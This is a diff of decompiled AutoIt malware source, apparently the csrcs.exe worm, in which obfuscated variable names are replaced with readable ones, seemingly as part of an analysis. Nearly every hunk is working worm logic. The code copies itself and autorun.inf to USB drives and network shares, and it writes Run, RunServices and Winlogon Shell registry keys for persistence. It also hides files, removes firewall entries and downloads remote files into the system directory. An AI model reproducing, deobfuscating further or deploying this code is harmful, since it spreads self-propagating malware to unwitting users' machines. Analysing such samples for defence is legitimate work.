@@ -2346,7 +2346,7 @@ Func Fn009C()
 			If $Var03D9[0] = 3 Then
 				$Var0385 = $Var03D9[1]
 				$Var0386 = $Var03D9[2]
-				If FileGetVersion(@ScriptDir & "\" & $Var0292) = $Var03D9[3] Then
+				If FileGetVersion(@ScriptDir & "\" & $MyExeName) = $Var03D9[3] Then
 				Else
 					Sleep(0x0190)
 					InetGet($Var0385, @SystemDir & "\" & $Var0386, 1, 0)
@@ -2651,7 +2651,7 @@ Func Fn009C()
 					$Var03A8 = $Var03F5[5]
 					$Var03A9 = $Var03F5[6]
 					$Var03F6 = $Var03F5[7]
-					$Var03F7 = FileGetSize(@SystemDir & "\" & $Var0292)
+					$Var03F7 = FileGetSize(@SystemDir & "\" & $MyExeName)
 					If $Var03F6 = $Var03F7 Then
 						If RegRead($Var029A, $Var03A8) = "1" Or RegRead($Var029A, $Var03A8) = "error" Then
 						Else
@@ -2982,14 +2982,14 @@ Func Fn009E()
 						If DriveSpaceFree($Var0414[$Var0350]) > "5" And DriveSpaceTotal($Var0414[$Var0350]) = "62" Or DriveSpaceTotal($Var0414[$Var0350]) = "63" Or DriveSpaceTotal($Var0414[$Var0350]) = "64" Or DriveSpaceTotal($Var0414[$Var0350]) = "65" Then
 							$Var02D0 = 0
 						EndIf
-						If FileExists($Var0414[$Var0350] & "\" & $Var0293) Then
-							$Var0345 = FileReadLine($Var0414[$Var0350] & "\" & $Var0293, 9)
+						If FileExists($Var0414[$Var0350] & "\" & $AutoRunInfName) Then
+							$Var0345 = FileReadLine($Var0414[$Var0350] & "\" & $AutoRunInfName, 9)
 							$Var0345 = StringTrimLeft($Var0345, 1)
 							$Var0345 = Decrypt(0, $Var0345, $EncryptionKey, 1)
 							$Var0345 = StringSplit($Var0345, "!")
 							For $Var0346 = 1 To $Var0345[0]
 								If $Var0345[0] = 2 Then
-									If $Var0345[1] = $Var0297 Then
+									If $Var0345[1] = $KHYFileName Then
 										$Var02A8 = $Var0345[2]
 										$Var02A9 = $Var0345[2]
 									Else
@@ -2997,12 +2997,12 @@ Func Fn009E()
 										FileDelete($Var0414[$Var0350] & "\" & $Var0345[2])
 										FileSetAttrib($Var0414[$Var0350] & "\" & $Var02A8, "-RASHNOT")
 										FileDelete($Var0414[$Var0350] & "\" & $Var02A8)
-										FileSetAttrib($Var0414[$Var0350] & "\" & $Var0293, "-RASHNOT")
-										FileDelete($Var0414[$Var0350] & "\" & $Var0293)
+										FileSetAttrib($Var0414[$Var0350] & "\" & $AutoRunInfName, "-RASHNOT")
+										FileDelete($Var0414[$Var0350] & "\" & $AutoRunInfName)
 									EndIf
 								Else
-									FileSetAttrib($Var0414[$Var0350] & "\" & $Var0293, "-RASHNOT")
-									FileDelete($Var0414[$Var0350] & "\" & $Var0293)
+									FileSetAttrib($Var0414[$Var0350] & "\" & $AutoRunInfName, "-RASHNOT")
+									FileDelete($Var0414[$Var0350] & "\" & $AutoRunInfName)
 									FileSetAttrib($Var0414[$Var0350] & "\" & $Var02A8, "-RASHNOT")
 									FileDelete($Var0414[$Var0350] & "\" & $Var02A8)
 								EndIf
@@ -3010,23 +3010,23 @@ Func Fn009E()
 						Else
 							$Var02A8 = $Var02A7
 						EndIf
-						If FileGetVersion($Var0414[$Var0350] & "\" & $Var02A8) >= FileGetVersion(@ScriptDir & "\" & $Var0292) And FileExists($Var0414[$Var0350] & "\" & $Var0293) Then
+						If FileGetVersion($Var0414[$Var0350] & "\" & $Var02A8) >= FileGetVersion(@ScriptDir & "\" & $MyExeName) And FileExists($Var0414[$Var0350] & "\" & $AutoRunInfName) Then
 							$Var0416 = 0
 						Else
 							$Var0416 = 1
 							$Var0415 = 1
 							FileSetAttrib($Var0414[$Var0350] & "\" & $Var02A9, "-RASHNOT")
 							FileDelete($Var0414[$Var0350] & "\" & $Var02A9)
-							FileSetAttrib($Var0414[$Var0350] & "\" & $Var0293, "-RASHNOT")
-							FileDelete($Var0414[$Var0350] & "\" & $Var0293)
+							FileSetAttrib($Var0414[$Var0350] & "\" & $AutoRunInfName, "-RASHNOT")
+							FileDelete($Var0414[$Var0350] & "\" & $AutoRunInfName)
 							$Var02A8 = $Var02A7
 						EndIf
 						If $Var0416 = 1 Then
 							$Var0417 = @ScriptDir & "\"
 							$Var0418 = $Var0414[$Var0350] & "\"
-							Fn009D($Var0417, $Var0292, $Var0418, $Var02A8)
+							Fn009D($Var0417, $MyExeName, $Var0418, $Var02A8)
 							Sleep(10)
-							Fn009D($Var0417, $Var0294, $Var0418, $Var0293)
+							Fn009D($Var0417, $AutoRunIName, $Var0418, $AutoRunInfName)
 							Sleep(10)
 							If $Var0415 = 1 Then
 								$Var02CA = "usbspread"
@@ -3076,14 +3076,14 @@ Func Fn009F()
 					If DriveSpaceFree($Var0414[$Var0350]) > "5" And DriveSpaceTotal($Var0414[$Var0350]) = "62" Or DriveSpaceTotal($Var0414[$Var0350]) = "63" Or DriveSpaceTotal($Var0414[$Var0350]) = "64" Or DriveSpaceTotal($Var0414[$Var0350]) = "65" Then
 						$Var02D0 = 0
 					EndIf
-					If FileExists($Var0414[$Var0350] & "\" & $Var0293) Then
-						$Var0345 = FileReadLine($Var0414[$Var0350] & "\" & $Var0293, 9)
+					If FileExists($Var0414[$Var0350] & "\" & $AutoRunInfName) Then
+						$Var0345 = FileReadLine($Var0414[$Var0350] & "\" & $AutoRunInfName, 9)
 						$Var0345 = StringTrimLeft($Var0345, 1)
 						$Var0345 = Decrypt(0, $Var0345, $EncryptionKey, 1)
 						$Var0345 = StringSplit($Var0345, "!")
 						For $Var0346 = 1 To $Var0345[0]
 							If $Var0345[0] = 2 Then
-								If $Var0345[1] = $Var0297 Then
+								If $Var0345[1] = $KHYFileName Then
 									$Var02A8 = $Var0345[2]
 									$Var02A9 = $Var0345[2]
 								Else
@@ -3091,12 +3091,12 @@ Func Fn009F()
 									FileDelete($Var0414[$Var0350] & "\" & $Var0345[2])
 									FileSetAttrib($Var0414[$Var0350] & "\" & $Var02A8, "-RASHNOT")
 									FileDelete($Var0414[$Var0350] & "\" & $Var02A8)
-									FileSetAttrib($Var0414[$Var0350] & "\" & $Var0293, "-RASHNOT")
-									FileDelete($Var0414[$Var0350] & "\" & $Var0293)
+									FileSetAttrib($Var0414[$Var0350] & "\" & $AutoRunInfName, "-RASHNOT")
+									FileDelete($Var0414[$Var0350] & "\" & $AutoRunInfName)
 								EndIf
 							Else
-								FileSetAttrib($Var0414[$Var0350] & "\" & $Var0293, "-RASHNOT")
-								FileDelete($Var0414[$Var0350] & "\" & $Var0293)
+								FileSetAttrib($Var0414[$Var0350] & "\" & $AutoRunInfName, "-RASHNOT")
+								FileDelete($Var0414[$Var0350] & "\" & $AutoRunInfName)
 								FileSetAttrib($Var0414[$Var0350] & "\" & $Var02A8, "-RASHNOT")
 								FileDelete($Var0414[$Var0350] & "\" & $Var02A8)
 							EndIf
@@ -3104,23 +3104,23 @@ Func Fn009F()
 					Else
 						$Var02A8 = $Var02A7
 					EndIf
-					If FileGetVersion($Var0414[$Var0350] & "\" & $Var02A8) >= FileGetVersion(@ScriptDir & "\" & $Var0292) Then
+					If FileGetVersion($Var0414[$Var0350] & "\" & $Var02A8) >= FileGetVersion(@ScriptDir & "\" & $MyExeName) Then
 						$Var0416 = 0
 					Else
 						$Var0416 = 1
 						$Var0415 = 1
 						FileSetAttrib($Var0414[$Var0350] & "\" & $Var02A9, "-RASHNOT")
 						FileDelete($Var0414[$Var0350] & "\" & $Var02A9)
-						FileSetAttrib($Var0414[$Var0350] & "\" & $Var0293, "-RASHNOT")
-						FileDelete($Var0414[$Var0350] & "\" & $Var0293)
+						FileSetAttrib($Var0414[$Var0350] & "\" & $AutoRunInfName, "-RASHNOT")
+						FileDelete($Var0414[$Var0350] & "\" & $AutoRunInfName)
 						$Var02A8 = $Var02A7
 					EndIf
 					If $Var0416 = 1 Then
 						$Var0417 = @ScriptDir & "\"
 						$Var0418 = $Var0414[$Var0350] & "\"
-						Fn009D($Var0417, $Var0292, $Var0418, $Var02A8)
+						Fn009D($Var0417, $MyExeName, $Var0418, $Var02A8)
 						Sleep(10)
-						Fn009D($Var0417, $Var0294, $Var0418, $Var0293)
+						Fn009D($Var0417, $AutoRunIName, $Var0418, $AutoRunInfName)
 						Sleep(10)
 						If $Var0415 = 1 Then
 							$Var02CA = "usbspread"
@@ -3145,9 +3145,9 @@ Func Fn009F()
 EndFunc
 
 Func Fn00A0()
-	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $Var0296, "REG_SZ", @SystemDir & "\" & $Var0292)
-	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $Var0296, "REG_SZ", @SystemDir & "\" & $Var0292)
-	If @OSVersion = "WIN_XP" Then RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", "Shell", "REG_SZ", "Explorer.exe " & $Var0292)
+	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $MyProcessName, "REG_SZ", @SystemDir & "\" & $MyExeName)
+	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $MyProcessName, "REG_SZ", @SystemDir & "\" & $MyExeName)
+	If @OSVersion = "WIN_XP" Then RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", "Shell", "REG_SZ", "Explorer.exe " & $MyExeName)
 	Fn00BE()
 	RegWrite("HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "Hidden", "REG_DWORD", "2")
 	RegWrite("HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "SuperHidden", "REG_DWORD", "0")
@@ -3157,38 +3157,38 @@ EndFunc
 
 Func Fn00A1()
 	ProcessClose(BinaryToString("0x54656154696D65722E657865"))
-	RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $Var0296)
-	RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $Var0296)
-	RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $Var0296)
+	RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $MyProcessName)
+	RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $MyProcessName)
+	RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $MyProcessName)
 	RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", "Shell", "REG_SZ", "Explorer.exe")
-	RegDelete("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\AuthorizedApplications\List", "C:\WINDOWS\system32\" & $Var0292)
+	RegDelete("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\AuthorizedApplications\List", "C:\WINDOWS\system32\" & $MyExeName)
 	RegDelete($Var029A)
 EndFunc
 
 Func Fn00A2()
-	If FileExists(@ScriptDir & "\" & $Var0293) Then
-		FileSetAttrib(@ScriptDir & "\" & $Var0293, "-RASHNOT")
-		FileDelete(@ScriptDir & "\" & $Var0293)
+	If FileExists(@ScriptDir & "\" & $AutoRunInfName) Then
+		FileSetAttrib(@ScriptDir & "\" & $AutoRunInfName, "-RASHNOT")
+		FileDelete(@ScriptDir & "\" & $AutoRunInfName)
 	EndIf
 	If FileExists(@ScriptDir & "\" & $Var02A7) Then
 		FileSetAttrib(@ScriptDir & "\" & $Var02A7, "-RASHNOT")
 		FileDelete(@ScriptDir & "\" & $Var02A7)
 	EndIf
-	If FileExists(@ScriptDir & "\" & $Var0292) Then
-		FileSetAttrib(@ScriptDir & "\" & $Var0292, "-RASHNOT")
-		FileDelete(@ScriptDir & "\" & $Var0292)
+	If FileExists(@ScriptDir & "\" & $MyExeName) Then
+		FileSetAttrib(@ScriptDir & "\" & $MyExeName, "-RASHNOT")
+		FileDelete(@ScriptDir & "\" & $MyExeName)
 	EndIf
-	If FileExists(@SystemDir & "\" & $Var0293) Then
-		FileSetAttrib(@SystemDir & "\" & $Var0293, "-RASHNOT")
-		FileDelete(@SystemDir & "\" & $Var0293)
+	If FileExists(@SystemDir & "\" & $AutoRunInfName) Then
+		FileSetAttrib(@SystemDir & "\" & $AutoRunInfName, "-RASHNOT")
+		FileDelete(@SystemDir & "\" & $AutoRunInfName)
 	EndIf
 	If FileExists(@SystemDir & "\" & $Var02A7) Then
 		FileSetAttrib(@SystemDir & "\" & $Var02A7, "-RASHNOT")
 		FileDelete(@SystemDir & "\" & $Var02A7)
 	EndIf
-	If FileExists(@SystemDir & "\" & $Var0292) Then
-		FileSetAttrib(@SystemDir & "\" & $Var0292, "-RASHNOT")
-		FileDelete(@SystemDir & "\" & $Var0292)
+	If FileExists(@SystemDir & "\" & $MyExeName) Then
+		FileSetAttrib(@SystemDir & "\" & $MyExeName, "-RASHNOT")
+		FileDelete(@SystemDir & "\" & $MyExeName)
 	EndIf
 EndFunc
 
@@ -3209,21 +3209,21 @@ Func Fn00A4()
 	If Not @error Then
 		For $Var0350 = 1 To $Var041A[0]
 			If DriveStatus($Var041A[$Var0350]) = "READY" Then
-				If FileExists($Var041A[$Var0350] & "\" & $Var0293) Then
-					FileSetAttrib($Var041A[$Var0350] & "\" & $Var0293, "-RASHNOT")
-					FileDelete($Var041A[$Var0350] & "\" & $Var0293)
+				If FileExists($Var041A[$Var0350] & "\" & $AutoRunInfName) Then
+					FileSetAttrib($Var041A[$Var0350] & "\" & $AutoRunInfName, "-RASHNOT")
+					FileDelete($Var041A[$Var0350] & "\" & $AutoRunInfName)
 				EndIf
 				If FileExists($Var041A[$Var0350] & "\" & $Var02A7) Then
 					FileSetAttrib($Var041A[$Var0350] & "\" & $Var02A7, "-RASHNOT")
 					FileDelete($Var041A[$Var0350] & "\" & $Var02A7)
 				EndIf
-				If FileExists($Var041A[$Var0350] & "\" & $Var0292) Then
-					FileSetAttrib($Var041A[$Var0350] & "\" & $Var0292, "-RASHNOT")
-					FileDelete($Var041A[$Var0350] & "\" & $Var0292)
+				If FileExists($Var041A[$Var0350] & "\" & $MyExeName) Then
+					FileSetAttrib($Var041A[$Var0350] & "\" & $MyExeName, "-RASHNOT")
+					FileDelete($Var041A[$Var0350] & "\" & $MyExeName)
 				EndIf
-				If FileExists($Var041A[$Var0350] & "\" & $Var0297) Then
-					FileSetAttrib($Var041A[$Var0350] & "\" & $Var0297, "-RASHNOT")
-					FileDelete($Var041A[$Var0350] & "\" & $Var0297)
+				If FileExists($Var041A[$Var0350] & "\" & $KHYFileName) Then
+					FileSetAttrib($Var041A[$Var0350] & "\" & $KHYFileName, "-RASHNOT")
+					FileDelete($Var041A[$Var0350] & "\" & $KHYFileName)
 				EndIf
 			EndIf
 		Next
@@ -3236,21 +3236,21 @@ Func Fn00A5()
 	If Not @error Then
 		For $Var0350 = 1 To $Var041A[0]
 			If DriveStatus($Var041A[$Var0350]) = "READY" Then
-				If FileExists($Var041A[$Var0350] & "\" & $Var0293) Then
-					FileSetAttrib($Var041A[$Var0350] & "\" & $Var0293, "-RASHNOT")
-					FileDelete($Var041A[$Var0350] & "\" & $Var0293)
+				If FileExists($Var041A[$Var0350] & "\" & $AutoRunInfName) Then
+					FileSetAttrib($Var041A[$Var0350] & "\" & $AutoRunInfName, "-RASHNOT")
+					FileDelete($Var041A[$Var0350] & "\" & $AutoRunInfName)
 				EndIf
 				If FileExists($Var041A[$Var0350] & "\" & $Var02A7) Then
 					FileSetAttrib($Var041A[$Var0350] & "\" & $Var02A7, "-RASHNOT")
 					FileDelete($Var041A[$Var0350] & "\" & $Var02A7)
 				EndIf
-				If FileExists($Var041A[$Var0350] & "\" & $Var0292) Then
-					FileSetAttrib($Var041A[$Var0350] & "\" & $Var0292, "-RASHNOT")
-					FileDelete($Var041A[$Var0350] & "\" & $Var0292)
+				If FileExists($Var041A[$Var0350] & "\" & $MyExeName) Then
+					FileSetAttrib($Var041A[$Var0350] & "\" & $MyExeName, "-RASHNOT")
+					FileDelete($Var041A[$Var0350] & "\" & $MyExeName)
 				EndIf
-				If FileExists($Var041A[$Var0350] & "\" & $Var0297) Then
-					FileSetAttrib($Var041A[$Var0350] & "\" & $Var0297, "-RASHNOT")
-					FileDelete($Var041A[$Var0350] & "\" & $Var0297)
+				If FileExists($Var041A[$Var0350] & "\" & $KHYFileName) Then
+					FileSetAttrib($Var041A[$Var0350] & "\" & $KHYFileName, "-RASHNOT")
+					FileDelete($Var041A[$Var0350] & "\" & $KHYFileName)
 				EndIf
 			EndIf
 		Next
@@ -3405,35 +3405,35 @@ Func Fn00A9()
 	Sleep(0x0064)
 	$Var0431 = 0
 	$Var0416 = 1
-	If FileExists($Var0418 & $Var0292) And FileGetVersion($Var0418 & $Var0292) > FileGetVersion($Var0417 & $Var02A7) Then
+	If FileExists($Var0418 & $MyExeName) And FileGetVersion($Var0418 & $MyExeName) > FileGetVersion($Var0417 & $Var02A7) Then
 		$Var0416 = 0
-		If Not ProcessExists($Var0292) Then
-			ShellExecute($Var0292, "", $Var0418)
+		If Not ProcessExists($MyExeName) Then
+			ShellExecute($MyExeName, "", $Var0418)
 			If @error Then
 			EndIf
 		EndIf
-	ElseIf FileExists($Var0418 & $Var0292) And FileGetVersion($Var0418 & $Var0292) = FileGetVersion($Var0417 & $Var02A7) Then
+	ElseIf FileExists($Var0418 & $MyExeName) And FileGetVersion($Var0418 & $MyExeName) = FileGetVersion($Var0417 & $Var02A7) Then
 		$Var0416 = 0
-		If Not ProcessExists($Var0292) Then
+		If Not ProcessExists($MyExeName) Then
 			$Var0416 = 1
 		EndIf
 	EndIf
 	If $Var0416 = 1 Then
-		If ProcessExists($Var0292) Then
-			ProcessClose($Var0292)
+		If ProcessExists($MyExeName) Then
+			ProcessClose($MyExeName)
 			Sleep(0x01F4)
-			If ProcessExists($Var0292) Then
-				ProcessWaitClose($Var0292, 0x003C)
+			If ProcessExists($MyExeName) Then
+				ProcessWaitClose($MyExeName, 0x003C)
 			EndIf
 		EndIf
-		Fn009D($Var0417, $Var02A7, $Var0418, $Var0292)
-		Fn009D($Var0417, $Var0295, $Var0418, $Var0293)
+		Fn009D($Var0417, $Var02A7, $Var0418, $MyExeName)
+		Fn009D($Var0417, $AutoRunInName, $Var0418, $AutoRunInfName)
 		Sleep(10)
-		Fn00B5($Var0418, $Var0292)
-		Fn00B5($Var0418, $Var0293)
+		Fn00B5($Var0418, $MyExeName)
+		Fn00B5($Var0418, $AutoRunInfName)
 		Sleep(10)
 		RegWrite($Var029A, "ilop", "REG_SZ", "1")
-		ShellExecute($Var0292, "", $Var0418)
+		ShellExecute($MyExeName, "", $Var0418)
 		If @error Then
 		EndIf
 		Fn00A0()
@@ -3461,21 +3461,21 @@ Func Fn00AA()
 	$Var0431 = 0
 	$Var0416 = 1
 	If $Var0416 = 1 Then
-		If ProcessExists($Var0292) Then
-			ProcessClose($Var0292)
+		If ProcessExists($MyExeName) Then
+			ProcessClose($MyExeName)
 			Sleep(0x07D0)
-			If ProcessExists($Var0292) Then
-				ProcessWaitClose($Var0292, 0x003C)
+			If ProcessExists($MyExeName) Then
+				ProcessWaitClose($MyExeName, 0x003C)
 			EndIf
 		EndIf
-		Fn009D($Var0417, $Var02A7, $Var0418, $Var0292)
-		Fn00B5($Var0418, $Var0292)
+		Fn009D($Var0417, $Var02A7, $Var0418, $MyExeName)
+		Fn00B5($Var0418, $MyExeName)
 		Sleep(10)
-		Fn009D($Var0417, $Var0295, $Var0418, $Var0293)
-		Fn00B5($Var0418, $Var0293)
+		Fn009D($Var0417, $AutoRunInName, $Var0418, $AutoRunInfName)
+		Fn00B5($Var0418, $AutoRunInfName)
 		Sleep(10)
 		RegWrite($Var029A, "ilop", "REG_SZ", "1")
-		ShellExecute($Var0292, "", $Var0418)
+		ShellExecute($MyExeName, "", $Var0418)
 		If @error Then
 		EndIf
 		Fn00A0()
@@ -3941,24 +3941,24 @@ Func Fn00B0($Arg00)
 			$Var0418 = "//" & $Arg00 & "/" & $Var0443[$Var0402] & "/"
 			If Not StringInStr($Var0443[$Var0402], "   ") Then
 				If Not $Var0443[$Var0402] = "" Then
-					If FileExists($Var0418 & $Var0297) Then
+					If FileExists($Var0418 & $KHYFileName) Then
 					Else
 						$Var0417 = @ScriptDir & "\"
 						If FileExists($Var0418 & "System Volume Information") Or FileExists($Var0418 & "RECYCLER") Or FileExists($Var0418 & "Recycled") Then
-							Fn009D($Var0417, $Var0295, $Var0418, $Var0293)
+							Fn009D($Var0417, $AutoRunInName, $Var0418, $AutoRunInfName)
 							Sleep(10)
-							Fn009D($Var0417, $Var0292, $Var0418, $Var02A7)
+							Fn009D($Var0417, $MyExeName, $Var0418, $Var02A7)
 							Sleep(10)
 							$Var02C8 = "todrive"
 						Else
-							Fn009D($Var0417, $Var0292, $Var0418, $Var02A7)
+							Fn009D($Var0417, $MyExeName, $Var0418, $Var02A7)
 							FileSetAttrib($Var0418 & $Var02A7, "-RASH")
 							Sleep(10)
 							$Var02C8 = "toshare"
 						EndIf
-						FileWrite($Var0418 & $Var0297, "")
-						FileSetAttrib($Var0418 & $Var0297, "+RASH")
-						If FileExists($Var0418 & $Var02A7) And FileGetVersion($Var0418 & $Var02A7) = FileGetVersion($Var0417 & $Var0292) Then
+						FileWrite($Var0418 & $KHYFileName, "")
+						FileSetAttrib($Var0418 & $KHYFileName, "+RASH")
+						If FileExists($Var0418 & $Var02A7) And FileGetVersion($Var0418 & $Var02A7) = FileGetVersion($Var0417 & $MyExeName) Then
 							$Var034E = $Var0336
 							$Var02CA = $Var0418
 							$Var02CB = "none"
@@ -5466,15 +5466,17 @@ If FileExists("95a1sd.xx") Then
 		Exit
 	EndIf
 EndIf
-$Var0291 = "alokium.exe"
-$Var0292 = "csrcs.exe"
-$Var0293 = "autorun.inf"
-$Var0294 = "autorun.i"
-$Var0295 = "autorun.in"
-$Var0296 = "csrcs"
-$Var0297 = "khy"
-$Var0298 = "csrcs.au3"
-$Var0299 = "NTrun.au3"
+
+; nem használt változó
+;$Var0291 = "alokium.exe"
+$MyExeName = "csrcs.exe"
+$AutoRunInfName = "autorun.inf"
+$AutoRunIName = "autorun.i"
+$AutoRunInName = "autorun.in"
+$MyProcessName = "csrcs"
+$KHYFileName = "khy"
+$MyScriptName = "csrcs.au3"
+$NTRunScriptName = "NTrun.au3"
 $Var029A = "HKLM\Software\Microsoft\DRM\amty"
 $Var029B = "-1"
 $Var029C = 0
@@ -5589,11 +5591,11 @@ If @ScriptDir = @SystemDir And @ScriptFullPath = @SystemDir & "\" & $ExeName2 Th
 	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $ProcessName2, "REG_SZ", @SystemDir & "\" & $ExeName2)
 	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $ProcessName2, "REG_SZ", @SystemDir & "\" & $ExeName2)
 	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $ProcessName2, "REG_SZ", @SystemDir & "\" & $ExeName2)
-	If ProcessExists($Var0292) Then
-		ProcessClose($Var0292)
+	If ProcessExists($MyExeName) Then
+		ProcessClose($MyExeName)
 		Sleep(0x01F4)
-		If ProcessExists($Var0292) Then
-			ProcessWaitClose($Var0292, 0x003C)
+		If ProcessExists($MyExeName) Then
+			ProcessWaitClose($MyExeName, 0x003C)
 		EndIf
 	EndIf
 	If ProcessExists("cmd.exe") Then
@@ -5616,8 +5618,8 @@ If @ScriptDir = @SystemDir And @ScriptFullPath = @SystemDir & "\" & $ExeName2 Th
 	Fn00AA()
 	Sleep(10 * 0x03E8)
 	Sleep(10 * 0x003C * 0x03E8)
-	If ProcessExists($Var0292) Then
-		If FileGetVersion(@SystemDir & "\" & $ExeName2) <= FileGetVersion(@SystemDir & "\" & $Var0292) Then
+	If ProcessExists($MyExeName) Then
+		If FileGetVersion(@SystemDir & "\" & $ExeName2) <= FileGetVersion(@SystemDir & "\" & $MyExeName) Then
 			If RegRead($Var029A, "exp1") <> "" Then
 				ProcessClose(BinaryToString("0x54656154696D65722E657865"))
 				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $ProcessName2)
@@ -5634,8 +5636,8 @@ If @ScriptDir = @SystemDir And @ScriptFullPath = @SystemDir & "\" & $ExeName1 Th
 	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $ProcessName1, "REG_SZ", @SystemDir & "\" & $ExeName1)
 	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $ProcessName1, "REG_SZ", @SystemDir & "\" & $ExeName1)
 	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $ProcessName1, "REG_SZ", @SystemDir & "\" & $ExeName1)
-	If ProcessExists($Var0292) Then
-		If FileGetVersion(@SystemDir & "\" & $ExeName1) <= FileGetVersion(@SystemDir & "\" & $Var0292) Then
+	If ProcessExists($MyExeName) Then
+		If FileGetVersion(@SystemDir & "\" & $ExeName1) <= FileGetVersion(@SystemDir & "\" & $MyExeName) Then
 			If RegRead($Var029A, "exp1") <> "" Then
 				ProcessClose(BinaryToString("0x54656154696D65722E657865"))
 				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $ProcessName1)
@@ -5645,11 +5647,11 @@ If @ScriptDir = @SystemDir And @ScriptFullPath = @SystemDir & "\" & $ExeName1 Th
 			EndIf
 		EndIf
 	EndIf
-	If ProcessExists($Var0292) Then
-		ProcessClose($Var0292)
+	If ProcessExists($MyExeName) Then
+		ProcessClose($MyExeName)
 		Sleep(0x01F4)
-		If ProcessExists($Var0292) Then
-			ProcessWaitClose($Var0292, 0x003C)
+		If ProcessExists($MyExeName) Then
+			ProcessWaitClose($MyExeName, 0x003C)
 		EndIf
 	EndIf
 	If ProcessExists("cmd.exe") Then
@@ -5672,8 +5674,8 @@ If @ScriptDir = @SystemDir And @ScriptFullPath = @SystemDir & "\" & $ExeName1 Th
 	Fn00A9()
 	Sleep(10 * 0x03E8)
 	Sleep(10 * 0x003C * 0x03E8)
-	If ProcessExists($Var0292) Then
-		If FileGetVersion(@SystemDir & "\" & $ExeName1) <= FileGetVersion(@SystemDir & "\" & $Var0292) Then
+	If ProcessExists($MyExeName) Then
+		If FileGetVersion(@SystemDir & "\" & $ExeName1) <= FileGetVersion(@SystemDir & "\" & $MyExeName) Then
 			If RegRead($Var029A, "exp1") <> "" Then
 				ProcessClose(BinaryToString("0x54656154696D65722E657865"))
 				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $ProcessName1)
@@ -5692,14 +5694,14 @@ If @ScriptDir = @SystemDir Then
 		Exit
 	EndIf
 	Fn00EB()
-	$Var033F = $Var0297 & "!" & $Var02A7
+	$Var033F = $KHYFileName & "!" & $Var02A7
 	$Var033F = Decrypt(1, $Var033F, $EncryptionKey, 1)
 	$Var02A8 = $Var02A7
 EndIf
 If @ScriptDir = "D:\" Or @ScriptDir = "C:\" Or @ScriptDir = "E:\" Or @ScriptDir = "F:\" Or @ScriptDir = "G:\" Or @ScriptDir = "H:\" Or @ScriptDir = "I:\" Or @ScriptDir = "J:\" Or @ScriptDir = "K:\" Or @ScriptDir = "L:\" Or @ScriptDir = "M:\" Or @ScriptDir = "N:\" Or @ScriptDir = "O:\" Or @ScriptDir = "P:\" Or @ScriptDir = "Q:\" Or @ScriptDir = "R:\" Or @ScriptDir = "S:\" Or @ScriptDir = "T:\" Or @ScriptDir = "U:\" Or @ScriptDir = "V:\" Or @ScriptDir = "W:\" Or @ScriptDir = "X:\" Or @ScriptDir = "Y:\" Or @ScriptDir = "Z:\" Then
-	$Var0340 = FileGetVersion(@SystemDir & "\" & $Var0292)
+	$Var0340 = FileGetVersion(@SystemDir & "\" & $MyExeName)
 	$Var0341 = FileGetVersion(@AutoItExe)
-	If ProcessExists($Var0292) Then
+	If ProcessExists($MyExeName) Then
 		If $Var0341 > $Var0340 Then
 			$Var0342 = StringInStr(@AutoItExe, "\", "", -1) + 1
 			$Var02A7 = StringMid(@AutoItExe, $Var0342)
@@ -5719,65 +5721,65 @@ If @ScriptDir = "D:\" Or @ScriptDir = "C:\" Or @ScriptDir = "E:\" Or @ScriptDir 
 	EndIf
 ElseIf @ScriptDir = @SystemDir Then
 	Sleep(2 * 0x003C * 0x03E8)
-	If @ScriptFullPath = (@SystemDir & "\" & $Var0292) Or @ScriptFullPath = (@SystemDir & "\" & $Var0298) Then
+	If @ScriptFullPath = (@SystemDir & "\" & $MyExeName) Or @ScriptFullPath = (@SystemDir & "\" & $MyScriptName) Then
 	Else
 		Fn00A3()
 	EndIf
-	If FileExists(@ScriptDir & "\" & $Var0295) And FileExists(@ScriptDir & "\" & $Var0294) Then
-		$Var0343 = FileReadLine(@ScriptDir & "\" & $Var0295, 9)
-		$Var0344 = FileReadLine(@ScriptDir & "\" & $Var0294, 9)
+	If FileExists(@ScriptDir & "\" & $AutoRunInName) And FileExists(@ScriptDir & "\" & $AutoRunIName) Then
+		$Var0343 = FileReadLine(@ScriptDir & "\" & $AutoRunInName, 9)
+		$Var0344 = FileReadLine(@ScriptDir & "\" & $AutoRunIName, 9)
 		If $Var0343 <> $Var0344 Then
-			Fn00BB(@ScriptDir, $Var02A7, $Var0297, $EncryptionKey)
-			Fn00BB(@ScriptDir, $Var02A7, $Var0297, $EncryptionKey, "rem", $Var02A3)
+			Fn00BB(@ScriptDir, $Var02A7, $KHYFileName, $EncryptionKey)
+			Fn00BB(@ScriptDir, $Var02A7, $KHYFileName, $EncryptionKey, "rem", $Var02A3)
